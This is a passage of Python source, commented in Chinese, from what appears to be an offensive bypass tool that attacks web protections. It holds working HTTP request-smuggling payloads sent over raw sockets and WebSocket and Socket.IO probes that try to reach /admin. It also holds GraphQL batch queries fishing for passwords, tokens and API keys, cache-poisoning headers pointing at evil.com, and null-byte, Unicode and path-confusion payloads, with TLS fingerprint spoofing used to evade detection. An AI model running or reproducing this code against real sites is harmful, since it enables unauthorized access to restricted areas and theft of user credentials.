                        'timeout': aiohttp.ClientTimeout(total=10)
                    }
                    
                    # 添加特定头部
                    if 'headers' in technique:
                        ws_kwargs['headers'] = technique['headers']
                    
                    # 添加子协议
                    if 'subprotocols' in technique:
                        ws_kwargs['protocols'] = technique['subprotocols']
                    
                    # 尝试建立WebSocket连接
                    async with session.ws_connect(ws_url, **ws_kwargs) as ws:
                        self.logger.info(f"[+] WebSocket连接成功: {technique['name']}")
                        
                        # 根据不同技术发送不同payload
                        if technique['name'] == 'http_over_ws':
                            # 发送HTTP请求伪装成WebSocket消息
                            await ws.send_str(technique['payload'])
                            
                            # 等待响应
                            try:
                                msg = await asyncio.wait_for(ws.receive(), timeout=3)
                                if msg.type == aiohttp.WSMsgType.TEXT:
                                    response = msg.data
                                    
                                    # 检查是否成功访问到目标
                                    if 'HTTP/' in response or 'admin' in response.lower():
                                        await ws.close()
                                        result = BypassResult(
                                            success=True,
                                            method='websocket',
                                            url=ws_url,
                                            details={
                                                'technique': technique['name'],
                                                'response_preview': response[:200],
                                                'content': response,
                                                'headers': {}
                                            },
                                            confidence=0.5,  # 临时值，立即重新评估
                                            risk_level='medium'
                                        )
                                        # 【数学引擎】动态置信度评估
                                        result.confidence = self.scorer.assess(result)
                                        return result
                            except asyncio.TimeoutError:
                                pass
                        
                        elif technique['name'] == 'direct_upgrade':
                            # 测试是否可以通过WebSocket访问受限资源
                            test_payloads = [
                                {'action': 'get', 'path': '/admin'},
                                {'cmd': 'fetch', 'resource': parsed.path or '/'},
                                f"GET:{parsed.path or '/admin'}"
                            ]
                            
                            for payload in test_payloads:
                                if isinstance(payload, dict):
                                    await ws.send_json(payload)
                                else:
                                    await ws.send_str(payload)
                                
                                try:
                                    msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                    if msg.type in [aiohttp.WSMsgType.TEXT, aiohttp.WSMsgType.BINARY]:
                                        data = msg.data if msg.type == aiohttp.WSMsgType.TEXT else msg.data.decode('utf-8', errors='ignore')
                                        
                                        # 检查响应
                                        if len(data) > 50 and not any(error in data.lower() for error in ['error', 'forbidden', 'denied']):
                                            await ws.close()
                                            result = BypassResult(
                                                success=True,
                                                method='websocket',
                                                url=ws_url,
                                                details={
                                                    'technique': technique['name'],
                                                    'payload': str(payload),
                                                    'response_length': len(data),
                                                    'content': data,
                                                    'headers': {}
                                                },
                                                confidence=0.5  # 临时值，立即重新评估
                                            )
                                            # 【数学引擎】动态置信度评估
                                            result.confidence = self.scorer.assess(result)
                                            return result
                                except:
                                    continue
                        
                        elif technique['name'] == 'socketio':
                            # Socket.IO特定协议
                            # 发送Socket.IO握手
                            await ws.send_str('2probe')
                            
                            try:
                                msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                if msg.type == aiohttp.WSMsgType.TEXT and '3probe' in msg.data:
                                    # Socket.IO连接成功
                                    # 尝试发送事件获取数据
                                    await ws.send_str('42["get","/admin"]')
                                    
                                    msg = await asyncio.wait_for(ws.receive(), timeout=2)
                                    if msg.type == aiohttp.WSMsgType.TEXT:
                                        await ws.close()
                                        result = BypassResult(
                                            success=True,
                                            method='websocket',
                                            url=ws_url,
                                            details={
                                                'technique': 'socketio',
                                                'protocol': 'socket.io',
                                                'content': msg.data,
                                                'headers': {}
                                            },
                                            confidence=0.5  # 临时值，立即重新评估
                                        )
                                        # 【数学引擎】动态置信度评估
                                        result.confidence = self.scorer.assess(result)
                                        return result
                            except:
                                pass
                        
                        await ws.close()
                        
                except aiohttp.WSServerHandshakeError as e:
                    # 握手失败，但可能暴露了信息
                    if hasattr(e, 'status') and e.status in [101, 426]:
                        # 101 = Switching Protocols (可能支持但需要特定条件)
                        # 426 = Upgrade Required (确认支持WebSocket)
                        continue
                    
                except aiohttp.ClientError:
                    continue
                except Exception as e:
                    if 'SSL' not in str(e):
                        self.logger.warning(f"[!] WebSocket {technique['name']} 失败: {type(e).__name__} - {str(e)[:50]}")
                    continue
        
        return BypassResult(
            success=False,
            method='websocket',
            url=url,
            details={
                'error': f'所有WebSocket绕过尝试失败，共测试{len(websocket_techniques)}种技术',
                'techniques_tested': [t['name'] for t in websocket_techniques],
                'failure_reason': 'websocket_connection_blocked_or_protocol_unsupported',
                'tested_endpoints': [t['url'] for t in websocket_techniques]
            }
        )
    
    async def _bypass_via_chunked(self, url: str) -> BypassResult:
        """通过分块传输编码绕过"""
        try:
            parsed = urllib.parse.urlparse(url)
            
            # 构建分块请求
            chunked_body = self._create_chunked_payload("test=payload")
            
            headers = {
                'Transfer-Encoding': 'chunked',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            headers.update(self.bypass_headers)
            
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    url,
                    data=chunked_body,
                    headers=headers,
                    ssl=False
                ) as resp:
                    if resp.status in [200, 201]:
                        content = await resp.text()
                        result = BypassResult(
                            success=True,
                            method='chunked_encoding',
                            url=url,
                            details={
                                'content': content,
                                'headers': dict(resp.headers)
                            },
                            confidence=0.5  # 临时值，立即重新评估
                        )
                        # 【数学引擎】动态置信度评估
                        result.confidence = self.scorer.assess(result)
                        return result
        except:
            pass
        
        return BypassResult(
            success=False,
            method='chunked_encoding',
            url=url
        )
    
    async def scan_for_smuggling(self, url: str, use_proxy: bool = False) -> SmugglingResult:
        """
        【制导与确认系统】
        智能化HTTP请求走私漏洞扫描 - 包含基准测试、攻击探针、确认机制
        """
        self.logger.info(f"\n[*] 启动对 {url} 的HTTP请求走私漏洞扫描...")
        
        # --------------------------------------------------------------------
        # 步骤 1: 发送基准请求，建立"正常"的标准
        # --------------------------------------------------------------------
        self.logger.info("    [1/3] 正在建立通信基准...")
        baseline_resp = await self._send_normal_request(url, use_proxy=use_proxy)
        if not baseline_resp:
            self.logger.error("    [!] 建立基准失败，目标可能无法访问。中止扫描。")
            return SmugglingResult(evidence="Baseline request failed")
        
        self.logger.info(f"    [+] 基准已建立: 状态码={baseline_resp['status']}, 响应时间={baseline_resp['time']:.2f}s")

        # --------------------------------------------------------------------
        # 步骤 2 & 3: 循环发送攻击探针，并立即发送确认请求
        # --------------------------------------------------------------------
        self.logger.info("    [2/3] 正在迭代发送攻击探针...")
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.netloc.split(':')[0]
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        use_ssl = parsed_url.scheme == 'https'

        # 从武器库中获取所有走私技术
        smuggling_payloads = self._get_smuggling_payloads(parsed_url)

        for technique in smuggling_payloads:
            self.logger.info(f"    [*] 测试技术: {technique['name']}...")
            
            # 发送攻击探针 (只管发送，不关心响应)
            await self._send_smuggling_probe(host, port, technique['payload'], use_ssl)
            
            # 立即发送确认请求
            confirmation_resp = await self._send_normal_request(url, use_proxy=use_proxy)
            if not confirmation_resp:
                self.logger.warning(f"    [!] 确认请求失败，跳过本次技术测试。")
                continue

            # --------------------------------------------------------------------
            # 步骤 4: 对比分析，寻找异常
            # --------------------------------------------------------------------
            analysis_result = self._analyze_smuggling_result(
                baseline=baseline_resp,
                confirmation=confirmation_resp,
                technique=technique['name']
            )

            if analysis_result and analysis_result.vulnerable:
                self.logger.error(f"    [!!!] 漏洞确认！ {analysis_result.evidence}")
                return analysis_result

        self.logger.info("    [3/3] 所有探针测试完毕，未发现明显漏洞。")
        return SmugglingResult(vulnerable=False, evidence="No anomalies detected")

    def _get_smuggling_payloads(self, parsed_url) -> list:
        """升级版走私技术武器库 - 6种核心技术"""
        smuggling_payloads = [
            # 1. 经典 CL.TE
            {
                'name': 'Classic CL.TE',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 2. 经典 TE.CL
            {
                'name': 'Classic TE.CL',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"5c\r\n"
                    f"GPOST /admin HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 10\r\n\r\n"
                    f"x=\r\n"
                    f"0\r\n\r\n"
                )
            },
            # 3. 高效 CL.TE 变体 (Content-Length: 0)
            {
                'name': 'CL.TE with Content-Length: 0',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 0\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 4. 头部混淆变体 (Header Obfuscation)
            {
                'name': 'CL.TE with Header Obfuscation',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding : chunked\r\n"  # 冒号前后加空格
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            # 5. 换行符变体 (Bare LF Injection)
            {
                'name': 'CL.TE with Bare LF',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\n"  # 使用 \n
                    f"Host: {parsed_url.netloc}\n"
                    f"Content-Length: 6\n"
                    f"Transfer-Encoding: chunked\n"
                    f"\n"
                    f"0\n\n"
                    f"G"
                )
            },
            # 6. TE.TE (双Transfer-Encoding，用于混淆)
            {
                'name': 'TE.TE with Obfuscation',
                'payload': (
                    f"POST {parsed_url.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed_url.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"Transfer-Encoding: cow\r\n"  # 混淆
                    f"\r\n"
                    f"E\r\n"
                    f"GPOST / HTTP/1.1\r\n"  # 走私的内容
                    f"\r\n"
                    f"0\r\n\r\n"
                )
            }
        ]
        return smuggling_payloads
    
    async def _send_normal_request(self, url: str, use_proxy: bool = False) -> Optional[Dict]:
        """发送一个正常的GET请求，用于获取基准和确认响应"""
        start_time = time.time()
        try:
            # 使用TLS-Client来发送"正常"请求，确保指纹真实
            resp = await self._make_tls_request(url, method='GET', profile='chrome_120', use_proxy=use_proxy)
            response_time = time.time() - start_time
            return {"status": resp['status_code'], "time": response_time}
        except Exception:
            return None

    async def _send_smuggling_probe(self, host: str, port: int, payload: str, use_ssl: bool):
        """发送原始的走私请求探针"""
        try:
            # 建立异步连接，自带超时控制
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_ssl, server_hostname=host if use_ssl else None),
                timeout=10  # 探针连接超时
            )
            
            writer.write(payload.encode())
            await writer.drain()
            
            # 只发送，不关心响应，短暂等待后直接关闭
            await asyncio.sleep(0.5) 
            writer.close()
            await writer.wait_closed()
        except Exception:
            # 失败是正常的，因为很多探针会被服务器直接关闭连接
            pass

    def _analyze_smuggling_result(self, baseline: dict, confirmation: dict, technique: str) -> Optional[SmugglingResult]:
        """对比分析基准和确认响应，判断是否存在漏洞"""
        result = SmugglingResult(
            baseline_status=baseline['status'],
            confirmation_status=confirmation['status'],
            baseline_time=baseline['time'],
            confirmation_time=confirmation['time']
        )

        # 1. 响应时间异常（最常见的指标）
        # 如果确认请求时间比基准长5倍，并且绝对时间超过8秒，极有可能是后端超时
        if confirmation['time'] > baseline['time'] * 5 and confirmation['time'] > 8.0:
            result.vulnerable = True
            result.technique = technique
            result.evidence = (f"响应时间异常: "
                               f"基准 {baseline['time']:.2f}s -> "
                               f"确认 {confirmation['time']:.2f}s (超时脱同步)")
            return result

        # 2. 状态码异常
        # 如果基准是200，但确认请求变成了404或50x，说明走私的请求污染了连接
        if baseline['status'] == 200 and confirmation['status'] in [404, 500, 502, 503, 400]:
            result.vulnerable = True
            result.technique = technique
            result.evidence = (f"状态码异常: "
                               f"基准 {baseline['status']} -> "
                               f"确认 {confirmation['status']} (连接中毒)")
            return result
        
        return None  # 未发现异常

    async def _bypass_via_smuggling(self, url: str) -> BypassResult:
        """
        通过HTTP请求走私绕过 - 使用智能化制导确认系统
        已升级为基于基准测试和确认机制的精确检测
        """
        self.logger.info(f"[*] 启动智能化HTTP请求走私检测: {url}")
        
        # 使用新的智能化扫描系统
        smuggling_result = await self.scan_for_smuggling(url)
        
        if smuggling_result.vulnerable:
            # 转换SmugglingResult为BypassResult
            result = BypassResult(
                success=True,
                method='http_smuggling_enhanced',
                url=url,
                details={
                    'technique': smuggling_result.technique,
                    'evidence': smuggling_result.evidence,
                    'baseline_status': smuggling_result.baseline_status,
                    'confirmation_status': smuggling_result.confirmation_status,
                    'baseline_time': smuggling_result.baseline_time,
                    'confirmation_time': smuggling_result.confirmation_time,
                    'enhanced_detection': True,
                    'analysis_method': 'baseline_confirmation_system',
                    'content': smuggling_result.evidence,  # 使用证据作为内容
                    'headers': {}  # HTTP走私通常不返回标准响应头
                },
                confidence=0.5,  # 临时值，立即重新评估
                risk_level='high'
            )
            # 【数学引擎】动态置信度评估
            result.confidence = self.scorer.assess(result)
            return result
        else:
            # 如果智能化检测失败，回退到传统方法进行快速验证
            self.logger.info("    [*] 智能化检测未发现漏洞，尝试传统快速验证...")
            return await self._legacy_smuggling_check(url)

    async def _legacy_smuggling_check(self, url: str) -> BypassResult:
        """
        传统走私检测方法 - 作为智能化检测的备用方案
        快速检测一些明显的走私漏洞
        """
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc.split(':')[0]
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        use_ssl = parsed.scheme == 'https'
        
        # 快速验证payload - 只测试最有效的几种
        quick_payloads = [
            {
                'name': 'Quick CL.TE',
                'payload': (
                    f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed.netloc}\r\n"
                    f"Content-Length: 6\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"0\r\n\r\n"
                    f"G"
                )
            },
            {
                'name': 'Quick TE.CL',
                'payload': (
                    f"POST {parsed.path or '/'} HTTP/1.1\r\n"
                    f"Host: {parsed.netloc}\r\n"
                    f"Content-Length: 4\r\n"
                    f"Transfer-Encoding: chunked\r\n"
                    f"\r\n"
                    f"E\r\n"
                    f"GPOST / HTTP/1.1\r\n\r\n"
                    f"0\r\n\r\n"
                )
            }
        ]
        
        for payload in quick_payloads:
            try:
                # 发送快速测试payload
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port, ssl=use_ssl, server_hostname=host if use_ssl else None),
                    timeout=5
                )
                
                writer.write(payload['payload'].encode())
                await writer.drain()
                
                # 快速检查响应
                response = await asyncio.wait_for(reader.read(4096), timeout=3)
                
                # 简单检查多重HTTP响应
                if response.count(b'HTTP/') > 1:
                    writer.close()
                    await writer.wait_closed()
                    result = BypassResult(
                        success=True,
                        method='http_smuggling_legacy',
                        url=url,
                        details={
                            'technique': payload['name'],
                            'detection_method': 'legacy_quick_check',
                            'response_indicators': 'multiple_http_responses',
                            'content': response.decode('utf-8', errors='ignore'),
                            'headers': {}
                        },
                        confidence=0.5,  # 临时值，立即重新评估
                        risk_level='high'
                    )
                    # 【数学引擎】动态置信度评估
                    result.confidence = self.scorer.assess(result)
                    return result
                
                writer.close()
                await writer.wait_closed()
                
            except asyncio.TimeoutError:
                # 超时可能是走私成功的标志
                result = BypassResult(
                    success=True,
                    method='http_smuggling_legacy',
                    url=url,
                    details={
                        'technique': payload['name'],
                        'detection_method': 'timeout_indicator',
                        'evidence': 'Connection timeout suggests desync',
                        'content': 'Connection timeout',
                        'headers': {}
                    },
                    confidence=0.5,  # 临时值，立即重新评估
                    risk_level='medium'
                )
                # 【数学引擎】动态置信度评估
                result.confidence = self.scorer.assess(result)
                return result
            except Exception:
                continue
        
        return BypassResult(
            success=False,
            method='http_smuggling_enhanced',
            url=url,
            details={
                'error': '所有走私检测方法失败，智能化和传统检测均未发现漏洞',
                'detection_methods': ['intelligent_baseline_confirmation', 'legacy_quick_check'],
                'failure_reason': 'no_smuggling_vulnerability_detected',
                'techniques_tested': len(self._get_smuggling_payloads(urllib.parse.urlparse(url)))
            }
        )
    
    async def scan_for_graphql_batching(self, url: str, use_proxy: bool = False) -> GraphQLResult:
        """
        【v2.0】GraphQL批处理漏洞扫描 - TLS-Client增强 + 智能载荷 + 精确验证
        集成'隐形涂层'(TLS指纹) + '穿甲弹头'(动态载荷) + '制导系统'(深度验证)
        """
        self.logger.info(f"\n[*] 启动对 {url} 的GraphQL批处理漏洞扫描 (v2.0)...")
        parsed_url = urllib.parse.urlparse(url)
        base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"

        # --------------------------------------------------------------------
        # 第一步: 使用TLS-Client发现GraphQL端点 - '隐形涂层'
        # --------------------------------------------------------------------
        common_endpoints = [
            '/graphql', '/api', '/api/graphql', '/graphql/api',
            '/v1/graphql', '/v2/graphql', '/graph', '/query',
            '/gql', '/api/query', '/playground'
        ]
        discovered_endpoint = None
        introspection_possible = False
        
        self.logger.info("    [1/3] 正在使用TLS指纹探测GraphQL端点...")
        
        for endpoint in common_endpoints:
            test_url = base_url + endpoint
            try:
                introspection_query = {"query": "{__schema{types{name}}}"}
                
                # 【升级点】使用强大的_make_tls_request方法 - 隐形涂层
                resp = await self._make_tls_request(
                    test_url, 
                    method='POST', 
                    headers={'Content-Type': 'application/json'},
                    json=introspection_query, 
                    profile='chrome_android',  # 使用移动端指纹
                    use_proxy=use_proxy
                )
                
                if (resp['status_code'] == 200 and 
                    'data' in resp['text'] and 
                    '__schema' in resp['text']):
                    discovered_endpoint = test_url
                    introspection_possible = True
                    self.logger.info(f"    [+] 端点确认: {discovered_endpoint} (内省可用)")
                    break
                elif resp['status_code'] == 200 and 'data' in resp['text']:
                    # GraphQL端点存在但内省被禁用
                    discovered_endpoint = test_url
                    introspection_possible = False
                    self.logger.info(f"    [+] 端点确认: {discovered_endpoint} (内省被禁用)")
                    break
                    
            except Exception as e:
                self.logger.warning(f"    [!] 测试端点 {endpoint} 失败: {type(e).__name__} - {str(e)[:50]}")
                continue
        
        if not discovered_endpoint:
            self.logger.warning("    [-] 未发现活动的GraphQL端点。扫描中止。")
            return GraphQLResult(vulnerable=False, evidence="No active GraphQL endpoint found.")

        # --------------------------------------------------------------------
        # 第二步: 构造智能载荷 - '穿甲弹头'
        # --------------------------------------------------------------------
        self.logger.info(f"    [2/3] 正在构造智能批处理载荷...")
        
        if introspection_possible:
            # 内省驱动 - 基于真实schema的高价值查询
            self.logger.info("    [*] 内省可用，构造基于schema的载荷...")
            batch_payload = [
                {"query": "{__typename}"},  # 基础类型查询
                {"query": "query viewer { viewer { id name email } }"},  # 高价值用户查询
                {"query": "{__schema{queryType{name}}}"},  # schema元数据
                {"query": "query me { me { id username token } }"},  # 当前用户查询
                {"query": "query users { users { id name email role } }"}  # 用户列表查询
            ]
        else:
            # 模糊测试 - 针对常见字段的探测载荷
            self.logger.info("    [*] 内省被禁用，使用模糊测试载荷...")
            batch_payload = [
                {"query": "{id,name,email}"},  # 基础用户字段
                {"query": "{user{id,name,password,token}}"},  # 敏感字段测试
                {"query": "{me{id,email,secret,apiKey}}"},  # API密钥探测
                {"query": "{viewer{id,username,role,permissions}}"},  # 权限探测
                {"query": "{admin{id,name,email,password}}"}  # 管理员探测
            ]

        # --------------------------------------------------------------------
        # 第三步: 执行攻击并精确验证 - '制导系统'
        # --------------------------------------------------------------------
        self.logger.info(f"    [3/3] 向 {discovered_endpoint} 发送批处理探针...")
        
        try:
            # 使用不同的TLS指纹发送批处理请求
            resp = await self._make_tls_request(
                discovered_endpoint,
                method='POST',
                headers={'Content-Type': 'application/json'},
                json=batch_payload,
                profile='okhttp',  # 换一个罕见的指纹
                use_proxy=use_proxy
            )
            
            # 【升级点】精确的结果验证逻辑 - 制导系统
            if resp['status_code'] == 200:
                try:
                    json_response = json.loads(resp['text'])
                    
                    # 验证响应格式：必须是列表且长度匹配
                    if isinstance(json_response, list) and len(json_response) == len(batch_payload):
                        self.logger.info(f"    [+] 服务器支持批处理：收到 {len(json_response)} 个响应")
                        
                        # 统计成功和失败的查询
                        successful_queries = 0
                        error_queries = 0
                        
                        for i, item in enumerate(json_response):
                            if isinstance(item, dict):
                                if 'data' in item and item['data'] is not None:
                                    successful_queries += 1
                                elif 'errors' in item:
                                    error_queries += 1
                        
                        self.logger.info(f"    [*] 查询结果：{successful_queries} 成功，{error_queries} 错误")
                        
                        # 只要有至少一个查询成功，就认为批处理可用
                        if successful_queries > 0:
                            # 【升级点】动态计算置信度 - 战果评估系统
                            confidence = 0.6  # 基础置信度
                            
                            # 加分项
                            if successful_queries == len(batch_payload):
                                confidence += 0.2  # 所有查询都成功
                            if introspection_possible:
                                confidence += 0.1  # 内省可用
                            if successful_queries >= len(batch_payload) // 2:
                                confidence += 0.05  # 大部分查询成功
                            
                            # 减分项
                            if error_queries > successful_queries:
                                confidence -= 0.1  # 错误多于成功
                            
                            evidence = (f"服务器成功处理了 {successful_queries}/{len(batch_payload)} 个批处理查询。"
                                      f"内省状态: {'可用' if introspection_possible else '被禁用'}。")
                            
                            self.logger.error(f"    [!!!] 漏洞确认！{evidence}")
                            return GraphQLResult(
                                vulnerable=True,
                                endpoint=discovered_endpoint,
                                evidence=evidence,
                                successful_queries_in_batch=successful_queries,
                                total_queries_in_batch=len(batch_payload),
                                confidence=min(0.95, confidence),
                                introspection_available=introspection_possible
                            )
                        else:
                            return GraphQLResult(
                                vulnerable=False, 
                                endpoint=discovered_endpoint, 
                                evidence=f"批处理返回 {len(json_response)} 个响应，但全部失败"
                            )
                    else:
                        return GraphQLResult(
                            vulnerable=False, 
                            endpoint=discovered_endpoint, 
                            evidence=f"响应格式异常：期望 {len(batch_payload)} 个，实际 {len(json_response) if isinstance(json_response, list) else 'not list'}"
                        )
                        
                except (json.JSONDecodeError, TypeError) as e:
                    return GraphQLResult(
                        vulnerable=False, 
                        endpoint=discovered_endpoint, 
                        evidence=f"JSON解析失败: {type(e).__name__}"
                    )
            else:
                return GraphQLResult(
                    vulnerable=False, 
                    endpoint=discovered_endpoint, 
                    evidence=f"批处理请求失败: HTTP {resp['status_code']}"
                )

        except Exception as e:
            self.logger.error(f"    [!] 批处理攻击异常: {type(e).__name__} - {str(e)[:100]}")
            return GraphQLResult(
                vulnerable=False, 
                endpoint=discovered_endpoint, 
                evidence=f"批处理攻击失败: {type(e).__name__} - {str(e)[:100]}"
            )

        self.logger.warning("    [-] 目标不支持批处理查询或存在防护。")
        return GraphQLResult(
            vulnerable=False, 
            endpoint=discovered_endpoint, 
            evidence="Target does not support batching or is protected."
        )

    async def _bypass_via_graphql(self, url: str, use_proxy: bool = False) -> BypassResult:
        """
        通过GraphQL批处理绕过 - 使用v2.0智能化扫描系统
        已升级为TLS-Client增强 + 动态载荷 + 精确验证
        """
        self.logger.info(f"[*] 启动GraphQL批处理绕过: {url}")
        
        # 使用新的智能化GraphQL批处理扫描系统
        graphql_result = await self.scan_for_graphql_batching(url, use_proxy=use_proxy)
        
        if graphql_result.vulnerable:
            # 转换GraphQLResult为BypassResult
            return BypassResult(
                success=True,
                method='graphql_batch_enhanced',
                url=graphql_result.endpoint,
                details={
                    'graphql_endpoint': graphql_result.endpoint,
                    'evidence': graphql_result.evidence,
                    'successful_queries': graphql_result.successful_queries_in_batch,
                    'total_queries': graphql_result.total_queries_in_batch,
                    'introspection_available': graphql_result.introspection_available,
                    'enhanced_detection': True,
                    'tls_enhanced': True,
                    'analysis_method': 'intelligent_batching_system'
                },
                confidence=graphql_result.confidence,
                risk_level='high'
            )
        else:
            # 如果智能化检测失败，回退到传统快速检测
            self.logger.info("    [*] 智能化检测未发现漏洞，尝试传统快速验证...")
            return await self._legacy_graphql_check(url, use_proxy=use_proxy)

    async def _legacy_graphql_check(self, url: str, use_proxy: bool = False) -> BypassResult:
        """
        传统GraphQL检测方法 - 作为智能化检测的备用方案
        快速检测一些明显的GraphQL端点
        """
        base_url = url.split('?')[0].rstrip('/')
        quick_endpoints = ['/graphql', '/api/graphql', '/query']
        
        for endpoint in quick_endpoints:
            test_url = base_url + endpoint
            
            try:
                # 使用TLS-Client发送简单批处理测试
                batch_query = [
                    {"query": "{__typename}"},
                    {"query": "query{viewer{id}}"}
                ]
                
                resp = await self._make_tls_request(
                    test_url,
                    method='POST',
                    headers={'Content-Type': 'application/json'},
                    json=batch_query,
                    profile='chrome_120',
                    use_proxy=use_proxy
                )
                
                if resp['status_code'] == 200:
                    try:
                        json_response = json.loads(resp['text'])
                        if isinstance(json_response, list) and len(json_response) >= 2:
                            result = BypassResult(
                                success=True,
                                method='graphql_batch_legacy',
                                url=test_url,
                                details={
                                    'endpoint': test_url,
                                    'detection_method': 'legacy_quick_check',
                                    'response_count': len(json_response),
                                    'content': resp['text'],
                                    'headers': resp.get('headers', {})
                                },
                                confidence=0.5,  # 临时值，立即重新评估
                                risk_level='medium'
                            )
                            # 【数学引擎】动态置信度评估
                            result.confidence = self.scorer.assess(result)
                            return result
                    except:
                        continue
                        
            except Exception:
                continue
        
        return BypassResult(
            success=False,
            method='graphql_batch_enhanced',
            url=url,
            details={
                'error': '所有GraphQL检测方法失败，智能化和传统检测均未发现端点',
                'detection_methods': ['intelligent_tls_enhanced', 'legacy_quick_check'],
                'endpoints_tested': ['graphql', 'api/graphql', 'query'],
                'failure_reason': 'no_graphql_endpoint_found_or_batching_disabled'
            }
        )
    
    async def _bypass_via_cache_poison(self, url: str) -> BypassResult:
        """通过缓存投毒绕过"""
        # 激进就完事了！
        poison_headers = {
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Forwarded-Server': 'evil.com',
            'X-HTTP-Host-Override': 'evil.com',
            'Cache-Control': 'max-age=0',
            'Pragma': 'no-cache'
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                # 先投毒
                async with session.get(
                    url,
                    headers=poison_headers,
                    ssl=False
                ) as resp:
                    if resp.status == 200:
                        # 再正常访问看是否被缓存
                        async with session.get(url, ssl=False) as resp2:
                            if resp2.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='cache_poison',
                                    url=url,
                                    risk_level='high',
                                    confidence=0.5
                                )
        except:
            pass
        
        return BypassResult(
            success=False,
            method='cache_poison',
            url=url
        )
    
    async def _bypass_via_protocol_confusion(self, url: str) -> BypassResult:
        """通过协议混淆绕过"""
        # HTTP/1.0 经常能绕过现代WAF
        try:
            parsed = urllib.parse.urlparse(url)
            host = parsed.netloc
            port = 443 if parsed.scheme == 'https' else 80
            
            if ':' in host:
                host, port = host.split(':')
                port = int(port)
            
            # 手动构建HTTP/1.0请求
            request = f"GET {parsed.path or '/'} HTTP/1.0\r\nHost: {host}\r\n\r\n"
            
            # 创建原始socket连接
            reader, writer = await asyncio.open_connection(host, port)
            
            writer.write(request.encode())
            await writer.drain()
            
            response = await reader.read(4096)
            
            if b'200 OK' in response:
                result = BypassResult(
                    success=True,
                    method='protocol_confusion',
                    url=url,
                    details={
                        'protocol': 'HTTP/1.0',
                        'content': response.decode('utf-8', errors='ignore'),
                        'headers': {}
                    },
                    confidence=0.5  # 临时值，立即重新评估
                )
                # 【数学引擎】动态置信度评估
                result.confidence = self.scorer.assess(result)
                return result
                
        except:
            pass
        
        return BypassResult(
            success=False,
            method='protocol_confusion',
            url=url
        )
    
    async def _bypass_via_hpp(self, url: str) -> BypassResult:
        """通过HTTP参数污染绕过"""
        parsed = urllib.parse.urlparse(url)
        
        if parsed.query:
            params = urllib.parse.parse_qs(parsed.query)
            
            # 各种HPP技术
            hpp_variations = []
            
            for key, values in params.items():
                # 重复参数
                hpp_params = params.copy()
                hpp_params[key] = values + ['innocent_value']
                hpp_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?"
                hpp_url += urllib.parse.urlencode(hpp_params, doseq=True)
                hpp_variations.append(hpp_url)
                
                # 数组形式
                hpp_params = params.copy()
                hpp_params[f"{key}[]"] = values
                del hpp_params[key]
                hpp_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?"
                hpp_url += urllib.parse.urlencode(hpp_params, doseq=True)
                hpp_variations.append(hpp_url)
            
            # 测试变体
            async with aiohttp.ClientSession() as session:
                for hpp_url in hpp_variations[:5]:  # 限制测试数量
                    try:
                        async with session.get(
                            hpp_url,
                            headers=self.bypass_headers,
                            ssl=False
                        ) as resp:
                            if resp.status == 200:
                                return BypassResult(
                                    success=True,
                                    method='parameter_pollution',
                                    url=hpp_url,
                                    confidence=0.6
                                )
                    except:
                        continue
        
        return BypassResult(
            success=False,
            method='parameter_pollution',
            url=url
        )
    
    async def _bypass_via_edge_cases(self, url: str) -> BypassResult:
        """通过边缘案例绕过实战集合"""
        parsed = urllib.parse.urlparse(url)
        
        # 边缘集合
        edge_case_tests = [
            # 1. 空字节注入 - 绕过扩展名检测
            {
                'name': 'null_byte_injection',
                'payloads': [
                    '/admin%00.jpg',
                    '/admin%00.png',
                    '/admin\x00.html',
                    '/admin%00',
                    '/.git%00/'
                ]
            },
            
            # 2. Unicode正规化攻击
            {
                'name': 'unicode_normalization',
                'payloads': [
                    '/ＡＤＭＩＮ',  # 全角字符
                    '/ＡＤＭİＮ',  # 土耳其语i
                    '/admin‮txt.php',  # RTL override
                    '/а𝐝𝗺𝒊𝓃',  # 混合Unicode
                    '/%61%64%6D%69%6E',  # 基础编码
                    '/\u0061\u0064\u006d\u0069\u006e'  # Unicode编码
                ]
            },
            
            # 3. 路径混淆
            {
                'name': 'path_confusion',
                'payloads': [
                    '/./admin',
                    '//admin',
                    '/admin/.',
                    '/admin/./',
                    '/admin/../admin',
                    '/admin;/',
                    '/admin#',
                    '/admin?',
